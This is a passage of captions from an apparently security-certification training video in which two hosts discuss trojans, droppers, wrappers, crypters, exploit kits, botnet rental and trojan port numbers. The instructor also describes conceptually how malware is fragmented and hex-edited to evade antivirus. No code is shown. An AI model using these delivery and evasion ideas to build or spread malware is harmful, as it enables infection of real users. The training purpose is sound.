thing,\ncuz people put them in but\n\n482\n00:24:22.710 --> 00:24:25.562\nit was a lot harder to get them\nto execute stuff on the CD-Rom.\n\n483\n00:24:25.562 --> 00:24:29.350\nAlthough the auto-play thing was kinda\ncool and we did come up with ways to auto\n\n484\n00:24:29.350 --> 00:24:31.830\nplay malware into the system\nonce we had done that.\n\n485\n00:24:31.830 --> 00:24:34.740\nBut you know it's a little bit harder and\nmost people aren't using those anymore.\n\n486\n00:24:34.740 --> 00:24:35.620\n&gt;&gt; Right.\n&gt;&gt; It kind of went the way\n\n487\n00:24:35.620 --> 00:24:37.130\nof the dinosaur as well.\n\n488\n00:24:37.130 --> 00:24:39.200\nBluetooth never really, or\n\n489\n00:24:39.200 --> 00:24:41.870\nrather Blu-ray never really\ntook off on the computer side.\n\n490\n00:24:41.870 --> 00:24:44.700\nIt took off on the home side for\ntheater, but you just don't really see\n\n491\n00:24:44.700 --> 00:24:47.950\npeople with a lot of Blu-ray stuff going\non where they're burning things, right.\n\n492\n00:24:47.950 --> 00:24:51.700\nToday it's just all cloud based and\nyeah you put stuff into the cloud.\n\n493\n00:24:51.700 --> 00:24:54.930\nBy the way, they are orbital.\n\n494\n00:24:54.930 --> 00:24:57.060\nExcuse me while I boggle my words.\n\n495\n00:24:57.060 --> 00:25:00.040\nThere are orbital platforms in the cloud\n\n496\n00:25:00.040 --> 00:25:02.110\nthat are used specifically\nto distribute malware.\n\n497\n00:25:02.110 --> 00:25:04.180\nRight?\nThere's all sorts of cloud based\n\n498\n00:25:04.180 --> 00:25:08.360\nstuff going on today, where the hackers\nhave these orbiting platforms that can\n\n499\n00:25:08.360 --> 00:25:12.160\nbe accessed to run bots and all sorts\nof stuff with regards to malware.\n\n500\n00:25:12.160 --> 00:25:14.380\nSo there's all these\nthings we gotta consider.\n\n501\n00:25:14.380 --> 00:25:17.410\nWe gave you a port list in one of\nthe prior episodes about common\n\n502\n00:25:17.410 --> 00:25:18.790\nports you should be aware of.\n\n503\n00:25:18.790 --> 00:25:21.750\nAnd there's all sorts of common\nports used by trojans that you would\n\n504\n00:25:21.750 --> 00:25:22.750\nwanna know about.\n\n505\n00:25:22.750 --> 00:25:24.850\nDo for instance,\nlet's play a little game shall we?\n\n506\n00:25:24.850 --> 00:25:29.320\n&gt;&gt; So if I say to you,\nwe can't do that one on air,\n\n507\n00:25:29.320 --> 00:25:33.226\nwe shouldn't make that reference so\nwe'll skip that one.\n\n508\n00:25:33.226 --> 00:25:36.531\n&gt;&gt; [LAUGH]\n&gt;&gt; So if I said to you for\n\n509\n00:25:36.531 --> 00:25:40.284\ninstance Port 22222.\n\n510\n00:25:40.284 --> 00:25:43.244\nRight?\nSo, five twos, 22222.\n\n511\n00:25:43.244 --> 00:25:44.216\nDo you have any idea what that is?\n\n512\n00:25:44.216 --> 00:25:45.523\n&gt;&gt; I do not.\n&gt;&gt; And you're lying if you say you do.\n\n513\n00:25:45.523 --> 00:25:46.754\n&gt;&gt; [LAUGH]\n&gt;&gt; I know you are, right?\n\n514\n00:25:46.754 --> 00:25:47.680\nYou have no clue.\n\n515\n00:25:47.680 --> 00:25:48.800\nNo idea whatsoever.\n\n516\n00:25:48.800 --> 00:25:52.740\nSo that's Proziac,\nthat's one of the trojans that's out.\n\n517\n00:25:52.740 --> 00:25:53.780\n&gt;&gt; 7789.\n\n518\n00:25:53.780 --> 00:25:56.750\nIC killer or ICK,\nit's what it's often called.\n\n519\n00:25:56.750 --> 00:25:59.670\n8787, this is the one we\ntalked about earlier.\n\n520\n00:25:59.670 --> 00:26:00.510\n&gt;&gt; Sub seven?\n\n521\n00:26:00.510 --> 00:26:02.237\n&gt;&gt; No, Back Orifice 2000.\n\n522\n00:26:02.237 --> 00:26:06.490\nSo there is all these different ones out,\nthere is a million of them out there.\n\n523\n00:26:06.490 --> 00:26:09.420\nYou can go pull up a list and\nget all sort of different ones.\n\n524\n00:26:09.420 --> 00:26:12.040\nI would not spend a huge amount of time\n\n525\n00:26:12.040 --> 00:26:15.510\nworrying about what are all the common\ntrojan ports for the exam, but\n\n526\n00:26:15.510 --> 00:26:19.130\nit would be good to have a sense of the\nfact that obviously they do map to ports.\n\n527\n00:26:19.130 --> 00:26:22.510\nI would know the tree different categories\nof ports generically that we talk about,\n\n528\n00:26:22.510 --> 00:26:23.780\nthe well known ports.\n\n529\n00:26:23.780 --> 00:26:27.600\nRight the dynamic ports and\nthe private ports that are assigned.\n\n530\n00:26:27.600 --> 00:26:30.920\nSo probably just know the categories\nknow the numerical ranges.\n\n531\n00:26:30.920 --> 00:26:34.360\nWe gave you a decent sized port list I\nknow that we provided to you right so\n\n532\n00:26:34.360 --> 00:26:35.880\njust think about that kind of stuff.\n\n533\n00:26:35.880 --> 00:26:38.630\nBut we've talked about how\ntrojans infect a system.\n\n534\n00:26:38.630 --> 00:26:42.210\nWe've talked about the idea\nthat it could actually go out.\n\n535\n00:26:42.210 --> 00:26:46.735\nWe didn't get into how could you create\na whole trojan or virus package right,\n\n536\n00:26:46.735 --> 00:26:48.540\nit's a little bit beyond\nour discussion here.\n\n537\n00:26:48.540 --> 00:26:50.920\nBut I showed you some basic\nexploit code just now.\n\n538\n00:26:50.920 --> 00:26:54.750\nBut you can create a trojan or\na malware package using a construct kit.\n\n539\n00:26:54.750 --> 00:26:58.680\nThere's all sorts of virus constructors,\ntrojan horse constructors out there.\n\n540\n00:26:58.680 --> 00:27:00.700\nYou create some sort of program.\n\n541\n00:27:00.700 --> 00:27:03.690\nYou would then create what's called\na dropper which is essentially going to be\n\n542\n00:27:03.690 --> 00:27:07.700\nwhat installs the malicious code or\nsoftware on the target system.\n\n543\n00:27:07.700 --> 00:27:10.500\nAnd so a dropper is just gonna\nto be a package that you wrap\n\n544\n00:27:10.500 --> 00:27:13.200\nthis system software,\nthis malicious code into.\n\n545\n00:27:13.200 --> 00:27:16.310\nAnd then we execute that and that will\nactually load some sort of program,\n\n546\n00:27:16.310 --> 00:27:18.940\nand also load the executable code.\n\n547\n00:27:18.940 --> 00:27:22.190\nSo we have the dropper, the dropper\ninstalls the malicious software,\n\n548\n00:27:22.190 --> 00:27:24.160\nthe wrapper wraps around all that.\n\n549\n00:27:24.160 --> 00:27:28.100\nThat installs everything, and then we\nare able to go and propagate the trojan,\n\n550\n00:27:28.100 --> 00:27:30.670\nexecute the dropper, and\nthen obviously take advantage.\n\n551\n00:27:30.670 --> 00:27:32.290\nSo we want to make sure\nwe are aware of this,\n\n552\n00:27:32.290 --> 00:27:36.230\nbecause this is what happens when you\ndownload stuff on a regular basis, right?\n\n553\n00:27:36.230 --> 00:27:38.840\nRemember, wrappers\nessentially are the binders\n\n554\n00:27:38.840 --> 00:27:41.260\nthat sit around the trojan executable.\n\n555\n00:27:41.260 --> 00:27:44.430\nThey're gonna be some sorta innocent\nlooking program that ultimately is gonna\n\n556\n00:27:44.430 --> 00:27:45.820\nget your attention.\n\n557\n00:27:45.820 --> 00:27:49.960\nYou're gonna launch that, and then we're\ngonna be able to go ahead and infect you.\n\n558\n00:27:49.960 --> 00:27:52.390\nAs I said,\nlots of different options out there.\n\n559\n00:27:52.390 --> 00:27:57.470\nIf you were to literally just\ngoogle trojan horse virus makers or\n\n560\n00:27:57.470 --> 00:28:01.330\nconstruct programs,\nyou will find a plethora\n\n561\n00:28:01.330 --> 00:28:05.230\nof them sitting out there without\ngoing into any names specifically.\n\n562\n00:28:05.230 --> 00:28:07.960\nBut there's all sorts of different ones.\n\n563\n00:28:07.960 --> 00:28:10.900\nThere's Galaxy Crypter,\nthere's Hidden site\n\n564\n00:28:10.900 --> 00:28:14.800\ncrypter there's a million of them out\nthere dark horse trojan is another one.\n\n565\n00:28:14.800 --> 00:28:17.650\nThere's all sorts of different ones\nthat you could find out there.\n\n566\n00:28:17.650 --> 00:28:20.720\nThe idea would be that ultimately\nyou would go out looking for one or\n\n567\n00:28:20.720 --> 00:28:22.058\nmore of these programs.\n\n568\n00:28:22.058 --> 00:28:25.265\nWhen we deploy a trojan, there's a lot\nof different ways to get them out there.\n\n569\n00:28:25.265 --> 00:28:26.465\nOne of the issues we're having more and\n\n570\n00:28:26.465 --> 00:28:30.275\nmore today is that because a lot of\ncompanies are starting to use app stores.\n\n571\n00:28:30.275 --> 00:28:32.735\nThey're building their own\nenterprise app stores.\n\n572\n00:28:32.735 --> 00:28:36.935\nWe have in Windows 8, 8.1, Windows 10,\nthe ability to run app stores and\n\n573\n00:28:36.935 --> 00:28:38.780\ndownload our own applications.\n\n574\n00:28:38.780 --> 00:28:40.540\nOr control the use of them.\n\n575\n00:28:40.540 --> 00:28:44.580\nIf we can infect the app store with\nan application that's seemingly on\n\n576\n00:28:44.580 --> 00:28:47.450\nthe surface is legitimate but\nactually is malware,\n\n577\n00:28:47.450 --> 00:28:51.430\nwe will then obviously be able to you know\nimpact a very large number of people.\n\n578\n00:28:51.430 --> 00:28:52.830\nSo I cringe when I hear people say,\n\n579\n00:28:52.830 --> 00:28:54.540\nwe have an app for that,\nwe should just download that.\n\n580\n00:28:54.540 --> 00:28:59.770\nYou know my rants about you know\nusing non consumer based devices.\n\n581\n00:28:59.770 --> 00:29:03.600\nAlthough I did see today actually of all\ndays as I was getting ready just checking\n\n582\n00:29:03.600 --> 00:29:07.890\nin on email that they said Windows\nmobile devices in terms of the phones,\n\n583\n00:29:07.890 --> 00:29:10.110\nsales are just going into the toilet.\n\n584\n00:29:10.110 --> 00:29:12.840\nThat platform is probably going away.\n\n585\n00:29:12.840 --> 00:29:16.310\nBut you know, the reality is, you're\nprobably going to be looking at Android,\n\n586\n00:29:16.310 --> 00:29:20.650\nApple, and Blackberry, may or may not be\nthere, except in some very niche areas.\n\n587\n00:29:20.650 --> 00:29:21.390\nBut the realities is,\n\n588\n00:29:21.390 --> 00:29:24.880\nyou've got consumer based platforms\nthat have their own external app stores.\n\n589\n00:29:24.880 --> 00:29:27.785\nYou know the iTunes store,\nthe Android Play store,\n\n590\n00:29:27.785 --> 00:29:30.155\nthat have been hit by malware in the past.\n\n591\n00:29:30.155 --> 00:29:33.195\nThere have been apps that have been\nmanaged to be smuggled into the platform,\n\n592\n00:29:33.195 --> 00:29:34.605\nthat are malware, that have been there for\n\n593\n00:29:34.605 --> 00:29:38.117\na period of time, however long they've\nbeen up before they'd been found out.\n\n594\n00:29:38.117 --> 00:29:40.127\nAnd it's not like it's happened once or\ntwice.\n\n595\n00:29:40.127 --> 00:29:45.377\nIt happens not consistently enough that\nI would say it's an epidemic but it is\n\n596\n00:29:45.377 --> 00:29:47.957\ncertainly something happening often enough\nthat we have to pay attention to it.\n\n597\n00:29:47.957 --> 00:29:52.697\nAnd so if we can actually trojan an app\nand then get you to download it,\n\n598\n00:29:52.697 --> 00:29:56.597\nwe have potential to reach hundreds\nperhaps thousands of systems and\n\n599\n00:29:56.597 --> 00:29:57.587\nbeen able to infect them.\n\n600\n00:29:57.587 --> 00:29:58.830\nThis is a big deal.\n\n601\n00:29:58.830 --> 00:30:01.900\nExploit kits can be used to deliver\nthis kind of software as well.\n\n602\n00:30:02.920 --> 00:30:04.090\nThere are many of them out there.\n\n603\n00:30:04.090 --> 00:30:08.460\nAgain, you can build you code through\nthis kind of a platform and then run it.\n\n604\n00:30:08.460 --> 00:30:12.880\nRemember there are denial of service and\ndistributor denial of service bot nets out\n\n605\n00:30:12.880 --> 00:30:15.120\nthere that are being\nused to spread malware.\n\n606\n00:30:15.120 --> 00:30:19.940\nYou can rent one from the Dark Web for\n$20- $30 bucks, US a day.\n\n607\n00:30:19.940 --> 00:30:22.420\nYou can find all sorts of\ndifferent ones out there.\n\n608\n00:30:22.420 --> 00:30:27.450\nBlackhole, Phoenix, and Infinity are real\nwell-known exploit kits that may be used,\n\n609\n00:30:27.450 --> 00:30:29.410\nto be able to build this kind of stuff.\n\n610\n00:30:29.410 --> 00:30:31.840\nThere's just hundreds of them out there.\n\n611\n00:30:31.840 --> 00:30:33.740\nYou could literally just go searching for\nthem.\n\n612\n00:30:33.740 --> 00:30:37.070\nRemember anti-virus software is\ngonna be scanning and looking for\n\n613\n00:30:37.070 --> 00:30:38.980\nthis stuff on a regular basis.\n\n614\n00:30:38.980 --> 00:30:42.830\nSo often times we'll chunk the trojan\nexploit code into multiple pieces,\n\n615\n00:30:42.830 --> 00:30:45.710\nfragmenting it,\ntrying to insert it in different pieces,\n\n616\n00:30:45.710 --> 00:30:48.300\nstitching it back together once\nwe get it into the system,\n\n617\n00:30:48.300 --> 00:30:52.030\nthat way the anti-virus\nsystem doesn't pick up on it.\n\n618\n00:30:52.030 --> 00:30:53.730\nJust keep that in mind.\n\n619\n00:30:53.730 --> 00:30:57.970\nWe often convert the trojans and\nchange it from an executable, as I said.\n\n620\n00:30:57.970 --> 00:30:58.860\nTo something else.\n\n621\n00:30:58.860 --> 00:31:03.030\nSo that way we hide, as I was telling you,\nthe potential to do this.\n\n622\n00:31:03.030 --> 00:31:07.250\nSo we change the content using\nHex editors, change check sums.\n\n623\n00:31:07.250 --> 00:31:09.020\nMake it look like something it's not.\n\n624\n00:31:09.020 --> 00:31:12.230\nSo going in and using a Hex editor\nto modify the code as we showed you.\n\n625\n00:31:12.230 --> 00:31:14.230\nIn the demo could potentially be done.\n\n626\n00:31:15.410 --> 00:31:17.800\nSo, there's all sorts of\ndifferent trojans out there right.\n\n627\n00:31:17.800 --> 00:31:24.450\nYou have VNC trojans, ICMP trojans, web\nbased trojans, data hiding trojans, RATs.\n\n628\n00:31:24.450 --> 00:31:26.570\nI talked about remote access trojans.\n\n629\n00:31:26.570 --> 00:31:29.000\nFTP trojans, botnet trojans.\n\n630\n00:31:29.000 --> 00:31:31.510\nFor every kind of program that exists or\n\n631\n00:31:31.510 --> 00:31:34.650\nessentially a category of\nTrojans that's out there.\n\n632\n00:31:34.650 --> 00:31:37.600\nYou just have to think about\nthe fact that anything you do\n\n633\n00:31:37.600 --> 00:31:39.820\npotentially can have\na Trojan associated with.\n\n634\n00:31:39.820 --> 00:31:43.252\nWe have command shell Trojans\na little as remotely control and\n\n635\n00:31:43.252 --> 00:31:44.973\nsend information to a system.\n\n636\n00:31:44.973 --> 00:31:48.892\nWe often will run them on the command\ncontrol side and then use them to keep\n\n637\n00:31:48.892 --> 00:31:52.823\ntrack of various Systems that we\ncompromise, so just keep that in mind.\n\n638\n00:31:52.823 --> 00:31:56.657\nSo we can go in and launch that\ncommand and control solution, and\n\n639\n00:31:56.657 --> 00:31:59.320\nthan have a screen up essentially, right.\n\n640\n00:31:59.320 --> 00:32:01.500\nAnd you have some multiple\nsystems that we're controlling.\n\n641\n00:32:01.500 --> 00:32:04.100\nThere's all sorts of different ones,\ndefacement Trojans that will\n\n642\n00:32:04.100 --> 00:32:07.760\nlet you go in, and you have to face\na program, modify what it does.\n\n643\n00:32:07.760 --> 00:32:11.085\nThere's just all these different ways\nto do this, remember as I mentioned,\n\n644\n00:32:11.085 --> 00:32:12.850\nbotnets are a big deal today.\n\n645\n00:32:12.850 --> 00:32:16.895\nSo if you get infected, you may become one\nof a million machines that's running that\n\n646\n00:32:16.895 --> 00:32:21.190\nbotnet software, that somebody could\nthen use against another system.\n\n647\n00:32:21.190 --> 00:32:23.645\nSo yeah,\njust lots of different ones out there,\n\n648\n00:32:23.645 --> 00:32:26.390\nskynet is a big one that's out there.\n\n649\n00:32:26.390 --> 00:32:28.660\nJust all sorts of\ndifferent ones that exist.\n\n650\n00:32:28.660 --> 00:32:30.600\nProxy server Trojans, kind of popular.\n\n651\n00:32:31.670 --> 00:32:36.330\nThey usually allow us to be able to go\nin and again, take over the system,\n\n652\n00:32:36.330 --> 00:32:40.420\nuse that system to hide activity,\nand to stealth what we're doing.\n\n653\n00:32:40.420 --> 00:32:42.730\nThousands of machines\ncan then be infected and\n\n654\n00:32:42.730 --> 00:32:46.000\ncontrolled through these cutout machines,\nor these proxies, that may or\n\n655\n00:32:46.000 --> 00:32:49.610\nmay not allow us to see the true\nnature of who's behind them.\n\n656\n00:32:49.610 --> 00:32:51.640\nSo this is also a problem for us.\n\n657\n00:32:51.640 --> 00:32:55.310\nAnd again, somebody could go out,\nremotely connect to your machine,\n\n658\n00:32:55.310 --> 00:32:57.590\nrun the software, and then take over.\n\n659\n00:32:57.590 --> 00:32:59.110\nFTP sites are a big issue,\n\n660\n00:32:59.110 --> 00:33:02.000\ncuz a lot of times there's\nFTP Trojans lurking out there.\n\n661\n00:33:02.000 --> 00:33:05.520\nSo they'll hit your system, when you\ngo to download, infect your system, and\n\n662\n00:33:05.520 --> 00:33:07.230\nthen obviously take control of it.\n\n663\n00:33:07.230 --> 00:33:08.990\nYou know what I saw, speaking of Trojans?\n\n664\n00:33:08.990 --> 00:33:12.100\nI was out getting some gas of all places.\n\n665\n00:33:12.100 --> 00:33:16.040\nYou know, just getting ready\nto actually go on a trip.\n\n666\n00:33:16.040 --> 00:33:17.700\nI had to gas up the car, and\n\n667\n00:33:17.700 --> 00:33:20.570\nI was at Costco sitting in line at\nthe gas station, right, waiting.\n\n668\n00:33:20.570 --> 00:33:24.120\nAnd there was a guy that was coming around\nand pulling on all the card readers to\n\n669\n00:33:24.120 --> 00:33:26.570\nmake sure that they had not\nput fake card readers in.\n\n670\n00:33:26.570 --> 00:33:29.570\nYeah, it's something I started to notice\nin the last couple of weeks that they've\n\n671\n00:33:29.570 --> 00:33:31.710\nbeen doing, because there's\nbeen a rash of these attacks,\n\n672\n00:33:31.710 --> 00:33:34.120\nwhere they're loading in\nthese fake card readers.\n\n673\n00:33:34.120 --> 00:33:37.160\nAnd then they're scanning the cards,\ngetting the credit information,\n\n674\n00:33:37.160 --> 00:33:39.820\nthen coming by later, and\njust pulling the fake reader off, and\n\n675\n00:33:39.820 --> 00:33:42.610\nit downloads to a chip in the reader and\nthen they take off.\n\n676\n00:33:42.610 --> 00:33:45.380\nSo they now have started to come around,\nand they're yanking on all of them to make\n\n677\n00:33:45.380 --> 00:33:48.236\nsure they're actually legitimate,\nwhich is kind of cool.\n\n678\n00:33:48.236 --> 00:33:51.890\nCuz I've, you know, told my wife and\nmy girls for the last couple years,\n\n679\n00:33:51.890 --> 00:33:54.790\nyou've gotta do that whenever you pull up\nto a gas station and pull up to the pump.\n\n680\n00:33:54.790 --> 00:33:57.470\nAlways check it before you put\nthe credit card in to make sure.\n\n681\n00:33:57.470 --> 00:33:59.390\nSo now my little one goes out,\ndaddy I wanna pump gas, and\n\n682\n00:33:59.390 --> 00:34:03.190\nthe first thing she does, she's yanking\non the, trying to pull the thing out.\n\n683\n00:34:03.190 --> 00:34:04.832\n&gt;&gt; [LAUGH]\n&gt;&gt; So but it's good, but\n\n684\n00:34:04.832 --> 00:34:07.000\nyou gotta be prepared, right.\n\n685\n00:34:07.000 --> 00:34:10.260\nSo there's all these different Trojans,\nright, all these different categories.\n\n686\n00:34:10.260 --> 00:34:12.960\nYou'll beware the website as we often say,\nright,\n\n687\n00:34:12.960 --> 00:34:15.290\nthere's all sorts of\nstuff going on out there.\n\n688\n00:34:15.290 --> 00:34:18.810\nThere's both secure and\nnon-secure protocol versions of this.\n\n689\n00:34:18.810 --> 00:34:22.820\nSo HTTP, HTTPS versions of\nTrojans that are running.\n\n690\n00:34:22.820 --> 00:34:24.800\nYeah, they're insidious,\nthey'll tunnel, right.\n\n691\n00:34:24.800 --> 00:34:28.220\nSo they'll protect themselves by\ntunneling and encrypting their traffic.\n\n692\n00:34:28.220 --> 00:34:32.490\nWe have ICMP tunneling Trojans, that\nare setting up covert channels that hide\n\n693\n00:34:32.490 --> 00:34:36.050\nthe data inside of a tunnel,\nso we can't see what it is.\n\n694\n00:34:36.050 --> 00:34:40.510\nAnd as a result of that, we're able to\nessentially firewalk through the firewall,\n\n695\n00:34:40.510 --> 00:34:42.890\nand get right to the command and\ncontrol server.\n\n696\n00:34:42.890 --> 00:34:45.200\nSo you gotta be really on\nguard about all this stuff.\n\n697\n00:34:45.200 --> 00:34:48.730\nThere is just a thousand different\nderivatives [LAUGH] of these things.\n\n698\n00:34:48.730 --> 00:34:49.525\n&gt;&gt; There really is.\n\n699\n00:34:49.525 --> 00:34:50.781\n&gt;&gt; That exist out there.\n\n700\n00:34:50.781 --> 00:34:53.865\nAnd I mean just their names also,\nI mean, you know, Hellraiser.\n\n701\n00:34:53.865 --> 00:34:56.196\n&gt;&gt; [LAUGH]\n&gt;&gt; And NJRat, and just, you know,\n\n702\n00:34:56.196 --> 00:34:57.610\nCovert Channel Trojan.\n\n703\n00:34:57.610 --> 00:35:00.200\nAnd just all these\ndifferent ones that exist.\n\n704\n00:35:00.200 --> 00:35:02.190\nThat's the job I often thought I wanted.\n\n705\n00:35:02.190 --> 00:35:05.060\nI wanted to be on the committee,\nright, that sits around and\n\n706\n00:35:05.060 --> 00:35:06.600\ngets to name all these things.\n\n707\n00:35:06.600 --> 00:35:09.870\n&gt;&gt; I'm wondering if the guy that's writing\nthe viruses, or gal, is sitting there and\n\n708\n00:35:09.870 --> 00:35:13.100\nspends as much time trying to come up with\nthe name, as they do for writing the code,\n\n709\n00:35:13.100 --> 00:35:14.840\nbecause that's the most important thing.\n\n710\n00:35:14.840 --> 00:35:19.490\n&gt;&gt; Right, all your hacker friends\nmake fun of you, you're the joke.\n\n711\n00:35:19.490 --> 00:35:23.050\nLike, yeah, Adam, he's the guy\nwho wrote the Nancy Pancy Trojan.\n\n712\n00:35:23.050 --> 00:35:24.359\nYeah, that was really cool.\n\n713\n00:35:24.359 --> 00:35:24.980\nRight?\nEven though--\n\n714\n00:35:24.980 --> 00:35:26.320\n&gt;&gt; It's like all the good names are taken.\n\n715\n00:35:26.320 --> 00:35:29.437\n&gt;&gt; Yeah, it destroyed everything it\ntouched, but you know, the name was so\n\n716\n00:35:29.437 --> 00:35:30.960\nweak, nobody took it seriously.\n\n717\n00:35:30.960 --> 00:35:32.980\n[LAUGH] So yeah, you gotta apply.\n\n718\n00:35:32.980 --> 00:35:34.420\nThere's a whole hierarchy.\n\n719\n00:35:34.420 --> 00:35:37.660\nThere's probably a patent office just for\nTrojan writers.\n\n720\n00:35:37.660 --> 00:35:41.390\nThat nobody knows about where you can\ngo and patent your Trojan name, right?\n\n721\n00:35:41.390 --> 00:35:45.454\nYeah, all this kind of stuff right, so\nobviously your encryptor Trojans, data\n\n722\n00:35:45.454 --> 00:35:49.660\nhiding Trojans we call then, that encrypt\nthe data files on the victim's system.\n\n723\n00:35:49.660 --> 00:35:52.717\nWe talked about them as being\nransomware essentially, but yeah,\n\n724\n00:35:52.717 --> 00:35:54.090\nwe can do this as well.\n\n725\n00:35:54.090 --> 00:35:57.780\nI've seen some just incredible,\ncrazy stuff out there,\n\n726\n00:35:57.780 --> 00:36:01.180\nwhere there's command and\ncontrol software that's running,\n\n727\n00:36:01.180 --> 00:36:04.120\nthat is giving you real time\nwindows into what's happening.\n\n728\n00:36:04.120 --> 00:36:07.070\nAnd I'm not just talking about, like,\nokay, I can see what you're doing.\n\n729\n00:36:07.070 --> 00:36:10.270\nBut, you know, it turns on the camera,\nenables the microphone.\n\n730\n00:36:10.270 --> 00:36:13.960\nYou know, we've heard about these\nTrojans that activate people's cameras.\n\n731\n00:36:13.960 --> 00:36:17.550\nYou hear about all the craziness that\npeople, you have been exposed doing,\n\n732\n00:36:17.550 --> 00:36:19.160\nbecause their cameras get activated.\n\n733\n00:36:19.160 --> 00:36:19.980\nThey don't realize it.\n\n734\n00:36:19.980 --> 00:36:20.770\nSo a lot of times, now,\n\n735\n00:36:20.770 --> 00:36:23.480\nyou'll see they have the little\ncamera covers right on the laptops.\n\n736\n00:36:23.480 --> 00:36:25.450\nYou'll notice by the way,\nright, no camera.\n\n737\n00:36:25.450 --> 00:36:26.070\n&gt;&gt; No camera.\n\n738\n00:36:26.070 --> 00:36:27.870\n&gt;&gt; Old school, right, no camera.\n\n739\n00:36:27.870 --> 00:36:31.040\nMy personal laptop, the one that\nI work with, the one I am often\n\n740\n00:36:31.040 --> 00:36:34.910\nsitting on working with you, has no\ncamera on it, for this exact reason.\n\n741\n00:36:34.910 --> 00:36:38.400\nBecause I know that it can\nbe remotely controlled.\n\n742\n00:36:38.400 --> 00:36:41.608\nI have a microphone but I can kill\nthat and obviously disable that.\n\n743\n00:36:41.608 --> 00:36:44.150\nBut you know,\nnobody can see what I'm doing, and\n\n744\n00:36:44.150 --> 00:36:46.980\nnobody can use it against\nthe environment that I'm in.\n\n745\n00:36:46.980 --> 00:36:49.060\nAll right, so I, you know,\ngo into a corporate data center,\n\n746\n00:36:49.060 --> 00:36:52.260\nI'm working with a customer in their\ndata center, and I have a machine,\n\n747\n00:36:52.260 --> 00:36:55.580\nI can't risk somebody potentially taking\nthat machine over and exposing it.\n\n748\n00:36:55.580 --> 00:36:58.570\nIt's something really to think about,\nand you have to be aware of the fact\n\n749\n00:36:58.570 --> 00:37:01.250\nthat this kind of stuff can happen and\nindeed does happen.\n\n750\n00:37:01.250 --> 00:37:02.380\nHappens all the time.\n\n751\n00:37:02.380 --> 00:37:04.210\nI notice you have a camera on that thing.\n\n752\n00:37:04.210 --> 00:37:05.150\n&gt;&gt; It's pointed right at me.\n\n753\n00:37:05.150 --> 00:37:06.030\n&gt;&gt; Yeah, there you go.\n\n754\n00:37:06.030 --> 00:37:07.210\nExactly.\n&gt;&gt; I will say that the one\n\n755\n00:37:07.210 --> 00:37:09.670\nat my house is pointed at the ceiling.\n\n756\n00:37:09.670 --> 00:37:10.170\nSo.\n&gt;&gt; Okay so.\n\n757\n00:37:10.170 --> 00:37:11.320\n&gt;&gt; Just think these,\n\n758\n00:37:11.320 --> 00:37:13.760\nyou know if somebody was to happen\nto get access and turn it on,\n\n759\n00:37:13.760 --> 00:37:16.470\nhopefully they couldn't see anything,\nthey might be able to hear.\n\n760\n00:37:16.470 --> 00:37:18.070\n&gt;&gt; Right well yeah obviously,\nyou know they can hear,\n\n761\n00:37:18.070 --> 00:37:21.310\npotentially the microphone may be\na problem, but they wouldn't see anything.\n\n762\n00:37:21.310 --> 00:37:24.060\nYou know, this is a big deal, all kidding\naside, it's obviously a big deal for a lot\n\n763\n00:37:24.060 --> 00:37:28.260\nof reasons but especially if you have\nyoung kids, I mean this is a huge issue.\n\n764\n00:37:28.260 --> 00:37:31.730\nSomebody could potentially turn\nthat camera on, observe them and\n\n765\n00:37:31.730 --> 00:37:35.820\nyou're obviously, if they're up to no\ngood, all sorts of bad things can happen,\n\n766\n00:37:35.820 --> 00:37:37.200\nand that's something we want to avoid.\n\n767\n00:37:37.200 --> 00:37:39.090\nSo, you really got to think about that and\n\n768\n00:37:39.090 --> 00:37:42.710\nunderstand that, you have these mobile\ndevices, tablets, things like that, yeah,\n\n769\n00:37:42.710 --> 00:37:46.020\nI do have a camera on my tablet,\nobviously I have one on my cellphone,\n\n770\n00:37:46.020 --> 00:37:49.715\nwhich is just about everybody does today,\nbut you have to think about those things.\n\n771\n00:37:49.715 --> 00:37:52.460\n&gt;&gt; Mm-hm.\n&gt;&gt; Because we have Trojans on those mobile\n\n772\n00:37:52.460 --> 00:37:53.780\nplatforms, that can also be a problem.\n\n773\n00:37:53.780 --> 00:37:56.380\nAnd we haven't even talked about viruses\nand worms and all the other stuff yet.\n\n774\n00:37:56.380 --> 00:37:59.320\nBut all that kind of stuff can\nbe an issue as well, obviously.\n\n775\n00:37:59.320 --> 00:37:59.840\n&gt;&gt; Absolutely.\n\n776\n00:37:59.840 --> 00:38:02.320\nAll right, Adam, again,\nanother great look there.\n\n777\n00:38:02.320 --> 00:38:05.250\nWe're talking about malware threats,\na lot of attention on.\n\n778\n00:38:05.250 --> 00:38:08.110\nNow we took a look at\nsome other sample code.\n\n779\n00:38:08.110 --> 00:38:09.270\n&gt;&gt; Sample code.\nFree samples.\n\n780\n00:38:09.270 --> 00:38:12.250\n&gt;&gt; We showed you how to\nwrite a simple little virus.\n\n781\n00:38:12.250 --> 00:38:13.490\nAgain, don't try it at home.\n\n782\n00:38:13.490 --> 00:38:14.440\nDon't try it on your PC.\n\n783\n00:38:14.440 --> 00:38:16.300\nSo you try it on your friend's PC.\n\n784\n00:38:16.300 --> 00:38:18.500\nNo, just kidding.\n&gt;&gt; No, don't do that, don't do that.\n\n785\n00:38:18.500 --> 00:38:19.400\n&gt;&gt; We also took a look at,\n\n786\n00:38:19.400 --> 00:38:22.310\nwhat was the name of that program you\nused to do the reverse engineering?\n\n787\n00:38:22.310 --> 00:38:22.910\n&gt;&gt; IDA?\n\n788\n00:38:22.910 --> 00:38:24.070\n&gt;&gt; IDA.\n\n789\n00:38:24.070 --> 00:38:25.020\nSo a really good one there.\n\n790\n00:38:25.020 --> 00:38:27.470\nActually took a look at the inside,\nthe inner workings, and\n\n791\n00:38:27.470 --> 00:38:30.760\nshowed you how you could look at\nthe logic flow of that program,\n\n792\n00:38:30.760 --> 00:38:32.570\nas well as the different\ncalls it was making.\n\n793\n00:38:32.570 --> 00:38:35.630\nSo if you're trying to break something\ndown and see what's going on.\n\n794\n00:38:35.630 --> 00:38:37.060\nBecause as you said we\nget these executables,\n\n795\n00:38:37.060 --> 00:38:40.770\nwe get these MSIs,\nwe really don't know what's going on.\n\n796\n00:38:40.770 --> 00:38:43.240\nIt's all about trusting\nthe vendor we got it from.\n\n797\n00:38:43.240 --> 00:38:46.398\nAnd we took a look at a lot of different,\nwe talked about Trojans.\n\n798\n00:38:46.398 --> 00:38:52.170\nYou know, and how many there are,\nthere's every possible kind of Trojan.\n\n799\n00:38:52.170 --> 00:38:55.392\nRemember, if it's free,\nit probably comes at some price,\n\n800\n00:38:55.392 --> 00:38:57.808\nyou're just not paying it upfront, right.\n\n801\n00:38:57.808 --> 00:39:00.120\nYou're paying for it in the background.\n\n802\n00:39:00.120 --> 